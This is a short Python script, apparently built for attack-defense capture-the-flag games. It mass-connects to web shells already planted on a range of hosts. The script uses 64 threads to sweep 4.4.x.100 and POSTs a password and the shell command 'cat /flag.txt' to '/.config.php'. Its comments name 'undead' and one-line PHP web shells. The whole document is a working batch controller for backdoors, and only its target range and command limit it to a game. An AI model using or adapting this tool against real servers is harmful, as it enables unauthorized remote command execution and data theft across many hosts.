import requests
import threading
from queue import Queue


class Start(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        queue = self.queue
        while not queue.empty():
            ip = queue.get()
            # 不死马
            paramsPost = {"passwd": password, "jonathan": command}
            # 普通一句话
            # paramsPost = {"jonathan":command}
            index_url = "http://" + str(ip) + index_path
            url = "http://" + str(ip) + path
            try:
                session.get(url=index_url, timeout=2)
            except Exception as e:
                pass

            try:
                response = session.post(url=url, data=paramsPost, timeout=2)
                if response.status_code == 200:
                    res = ip + ":" + response.text
                    echo(res)
            except Exception as e:
                pass


def echo(text):
    text = text

    with open(logfile, 'a+') as f:
        f.write(text)

    print(text)


def get_flag():
    global ip
    queue = Queue()
    for i in range(1, 255):
        ip = ip
        queue.put(ip % i)

    thread_count = 64
    threads = []

    for i in range(0, thread_count):
        thread = Start(queue)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()


if __name__ == '__main__':
    session = requests.Session()
    logfile = "批量连接一句话.txt"
    ip = "4.4.%s.100"
    command = "cat /flag.txt"
    password = "jonathan"
    index_path = "/index.php"
    path = "/.config.php"
    # path = "/index.php"
    get_flag()
